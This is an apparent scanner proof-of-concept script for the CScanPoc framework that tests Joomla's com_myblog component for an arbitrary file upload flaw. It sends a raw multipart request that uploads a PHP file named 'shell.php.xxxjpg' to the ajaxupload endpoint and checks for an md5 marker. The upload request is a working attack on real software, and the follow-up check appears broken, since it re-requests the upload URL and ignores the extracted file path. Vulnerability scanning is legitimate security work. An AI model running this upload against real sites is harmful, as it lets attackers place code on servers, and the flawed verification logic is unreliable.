# coding: utf-8
import re
import time

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Joomla_0011'  # 平台漏洞编号，留空
    name = 'Joomla! com_Myblog Arbitrary File Upload Vulnerability'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_UPLOAD  # 漏洞类型
    disclosure_date = '2015-07-20'  # 漏洞公布时间
    desc = '''
        /index.php?option=com_myblog&task=ajaxupload 存在文件上传漏洞。
    '''  # 漏洞描述
    ref = 'https://0day.today/exploit/23901'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Joomla!'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '263cb6ec-cde9-4ca0-91d2-9eb3eda0db5f'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            raw = '''POST /index.php?option=com_myblog&task=ajaxupload HTTP/1.1
Host: www.baidu.com
Accept: */*
Content-Length: 235
Content-Type: multipart/form-data; boundary=------------------------672e7d0b915bbd1b

--------------------------672e7d0b915bbd1b
Content-Disposition: form-data; name="fileToUpload"; filename="shell.php.xxxjpg"
Content-Type: application/octet-stream

<?php echo md5(0x22);unlink(__FILE__);?>
--------------------------672e7d0b915bbd1b'''
            verity_url = self.target + '/index.php?option=com_myblog&task=ajaxupload'
            code, head, res, errcode, _ = hh.http(verity_url, raw=raw)

            if 'shell.php.xxxjpg' in res:
                shell = re.findall(r"source: '(.+)'", res)
                if shell:
                    code, head, res, errcode, _ = hh.http(verity_url)
                    if 'e369853df766fa44e1ed0ff613f563bd' in res:
                        # security_hole(shell[0])
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
